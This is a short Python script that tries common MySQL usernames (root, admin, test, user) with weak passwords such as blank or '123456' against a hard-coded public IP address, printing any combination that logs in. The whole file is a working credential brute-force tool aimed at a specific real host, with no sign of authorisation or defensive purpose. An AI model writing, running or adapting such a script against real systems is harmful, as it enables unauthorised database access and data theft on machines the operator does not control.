#-*- coding:utf-8 -*-
import pymysql
mysql_username = ('root','test','admin','user')
common_weak_password = ('','123456','test','root','admin','user')
success = False
host = "120.237.206.74"
port = 3306
for username in mysql_username:
  for password in common_weak_password:
    try:
      conn = pymysql.connect(   host=host,user=username,password=password, port=3306)
      success = True
      if success:
        print (username, password)
    except Exception as e:
      pass
print('scan finish')